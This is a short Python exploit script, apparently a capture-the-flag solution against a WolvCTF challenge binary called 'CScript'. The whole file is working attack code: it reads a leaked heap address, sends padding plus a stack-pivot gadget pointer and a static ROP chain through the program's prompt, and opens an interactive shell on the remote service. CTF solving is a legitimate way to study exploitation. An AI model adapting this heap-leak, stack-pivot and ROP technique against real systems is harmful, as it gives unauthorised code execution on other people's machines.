#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from rootkit.exploit import *
from time import sleep
import os
import base64

exe = context.binary = ELF("./CScript")
host = (
    args.HOST
    or "cscript.wolvctf.io"
    # or "0.0.0.0"
)
port = int(args.PORT or 1337)

gdbscript = """
b *0x4048ac
c
""".format(
    **locals()
)

libc = SetupLibcELF()

io = start()

heap_base = GetInt(rl())[0]

stack_pivot = gadget("xchg eax, esp; ret");

rop_chain = static_rop()

rop_addr = heap_base + 0x138bc

stack_pivot_gadget_ptr = heap_base + 0x138b4

padding = "A"*103

hb()

payload = f'a = Store("{padding}")'.encode() + p(stack_pivot_gadget_ptr-0x11) + p(rop_addr) + p(stack_pivot) + rop_chain
sla(b'>>', payload)

payload = b"a,#"
sla(b'>>', payload)

payload = b"Print(a)"
sla(b'>>', payload)

io.interactive()
